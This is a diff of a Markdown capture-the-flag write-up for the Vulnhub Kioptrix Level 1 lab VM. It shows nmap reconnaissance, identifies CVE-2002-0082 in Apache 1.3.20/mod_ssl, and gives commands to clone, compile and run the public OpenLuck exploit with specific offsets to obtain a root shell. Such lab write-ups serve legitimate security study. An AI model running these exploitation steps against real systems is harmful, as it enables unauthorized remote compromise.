@@ -1,25 +1,28 @@
 # Kioptrix Level 1
 
+![Info](./images/1.png)
 
+**Platform**: Vulnhub
+**Difficulty Level**: Easy
+**IP Address/Target UR**L: 192.168.29.17
+**Date**: September 3, 2024
+**Objective**: The goal is to acquire root access on the Kioptrix machine using basic tools and techniques for vulnerability assessment and exploitation.
 
-This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
+## Enumeration
+### Initial Reconnaissance
+#### **Tools Used** : Nmap
 
-[Download Link](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
+Finding the IP address of the machine:
 
-![Info](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/1.png)
-![Description](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/2.png)
-
-## Initial Recon
-### Nmap Scan
-Finding the ip address of machine
-```
+```bash
 nmap -sn 192.168.29.1/24
 ```
-![IP image](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/3.png)
 
-After knowing the ip address let's run a full port scan to see which ports are open.
+![IP image](./images/3.png)
 
-```
+Running a full port scan:
+
+```bash
 # nmap -v -p- 192.168.29.17 -oN nmap_initial_scan.txt
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 16:48 EDT
@@ -52,13 +55,24 @@ MAC Address: 08:00:27:7B:60:42 (Oracle VirtualBox virtual NIC)
 Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds
            Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+```
 
--v = verbose mode
--p- = all port scan 
--oN = output
+### Results:
+The following ports were discovered to be open:
 
-We have  22,80,111,139,443,32768 ports open on this machine. Now we will go for the version detection of services running.
+- 22/tcp: OpenSSH 2.9p2 (protocol 1.99)
+- 80/tcp: Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+- 111/tcp: rpcbind
+- 139/tcp: NetBIOS-SSN (Samba smbd)
+- 443/tcp: Apache with SSL
+- 32768/tcp: status (RPC)
 
+### Service Enumeration
+#### Focused Enumeration:
+
+After identifying the open ports, I proceeded with service detection to gather more information about the running services.
+
+```bash
 # nmap -v -p 22,80,111,139,443,32768 -sC -sV -A 192.168.29.17 -oN nmap_services_scan.txt
 
 PORT      STATE SERVICE     VERSION
@@ -135,116 +149,91 @@ Host script results:
 TRACEROUTE
 HOP RTT     ADDRESS
 1   0.47 ms 192.168.29.17
-
--sC = script scan
--sV = open ports service/version information
--A = enable os detection
-
-We have 
-22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
-80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
-111/tcp   open  rpcbind     2 (RPC #100000)
-139/tcp   open  netbios-ssn Samba smbd (workgroup: 5MYGROUP)
-443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
-32768/tcp open  status      1 (RPC #100024)
-```
-## Enumeration
-Let's start the enumeration from port no 80 which is running apache httpd 1.3.20
-
-```
-@ 80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
 ```
 
-On hitting ip address on browser we have a test page  of apache on this
+### Results
+- Port 22: OpenSSH 2.9p2 (protocol 1.99) supporting SSHv1
+- Port 80: Apache httpd 1.3.20 with mod_ssl 2.8.4 (OpenSSL 0.9.6b)
+- Port 111: rpcbind 2 (RPC #100000)
+- Port 139: Samba smbd (workgroup: MYGROUP)
+- Port 443: Apache/1.3.20 with SSL enabled
+- Port 32768: status 1 (RPC #100024)
 
-![Loading Page](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/4.png)
+## Vulnerability Identification
+### Identifying Vulnerabilities
+#### Apache and mod_ssl:
+The Apache version (1.3.20) along with mod_ssl (2.8.4) is known to be vulnerable to CVE-2002-0082.
 
-Running gobuster to check if there is any directory or file that can reveal some information to proceed further.
+![image](./images/6.png)
 
-```
-gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.29.17 -t 50 -b 503,404
-```
+#### Research and References:
+The vulnerability allows remote attackers to execute arbitrary code via a crafted request to mod_ssl.
 
-![Gobuster image](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/5.png)
+## Exploitation
+### Initial Exploit
+#### Exploit Used: [OpenLuck (CVE-2002-0082)](https://github.com/heltonWernik/OpenLuck)
 
-Nothing interesting is found in gobuster scan.
-On searching web I found that the apache and mod_ssl version are vulnerable to [CVE-2002-0082](https://nvd.nist.gov/vuln/detail/CVE-2002-0082).
+![image](./images/7.png)
 
-![exploit image](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/6.png)
-
-## Exploiting
-
-Download the exploit from [here](https://github.com/heltonWernik/OpenLuck?tab=readme-ov-file) and run.
-
-![github page image](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/7.png)
-
-```
+Clone the exploit repository:
+```bash
 git clone https://github.com/heltonWernik/OpenLuck.git
 ```
 
-![kali  term1](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/8.png)
+![clone](./images/8.png)
 
-Install the requirements mentioned. 
-
-```
+Install dependencies:
+```bash
 apt-get install libssl-dev
 ```
 
-![kali term2](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/9.png)
+![dependency](./images/9.png)
 
-Compile the file using 
-```
+Compile the exploit:
+
+```bash
 gcc -o OpenFuck OpenFuck.c -lcrypto
-Ignore the errors
 ```
+Ignore any errors during compilation.
 
-Give permissions.
-```
-chmod +x OpenFuck
-```
+Run exploit: 
 
-Run the exploit
-```
+```bash
 ./OpenFuck
-It gives us the list of some offsets with the name of os and apache version.
 ```
 
-![kali term3](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/10.png)
+![openfuck](./images/10.png)
 
-Check the os details and apache version in the list and use that offset.
-OS = Redhat 
-Apache Version = 1.3.20
+It gave us the list of offsets along with the version of OS and Apache.
+We have Redhat and Apache version 1.3.20
 
-Use grep command to filter the output and see what we need.
+Now use grp command to get the offset of our use. 
 
-![kali term4](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/11.png)
-
-We can try offset 0x6a and 0x6b which matches our versions and os.
+```bash
+./OpenFuck | grep 1.3.20
 ```
+
+![offset](./images/11.png)
+
+We will try both ```0x6a``` and ```0x6b```
+First Let's try ```0x6a```
+
+```bash
 ./OpenFuck 0x6a 192.168.29.17 443 -c 40
 ```
 
-![kali term5](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/12.png)
+![](./images/12.png)
 
-This spawned the shell but didn't last long and exited.
+This exited by saying GoodBye!
+
+Let's try ```0x6b```
+
+```bash
+./OpenFuck 0x6b 192.168.29.17 443 -c 50
 ```
-./OpenFuck 0x6b 192.168.29.17 443 -c 40
-```
 
-![kali term6](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/13.png)
+![](./images/13.png)
 
-This gave us the shell.
+This directly gave us the root shell
 
-![kali term7](https://github.com/satharv/Oscp_Prep/blob/main/Writeups/vulnhub/Kioptrix_level_1/images/14.png)
-
-We directly got the root shell.
-
-
-
-
-
-
-
-
-
-
+![](./images/14.png)
